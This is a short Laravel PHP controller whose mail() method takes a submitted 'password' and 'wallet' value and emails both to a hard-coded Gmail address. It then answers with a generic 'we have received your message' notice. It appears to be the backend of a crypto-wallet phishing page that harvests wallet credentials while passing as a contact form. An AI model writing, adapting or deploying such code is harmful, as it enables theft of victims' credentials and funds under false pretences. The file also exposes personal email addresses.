<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Mail;

class Home extends Controller
{
    public function mail(Request $request){
        
        $data = array(
                        'password'=>$request->input('password'),
                        'wallet'=>$request->input('wallet')
                     );
               
              Mail::send('mail',$data,function($message) {
                 $message->to('teamwaruq@gmail.com');
                 $message->subject ('You have a Message');
                 $message->from('nadym.baba@gmail.com');
              });
             return redirect()->route('home')->with('success','We have recieved your message,we will get back to you soon');
           }
}
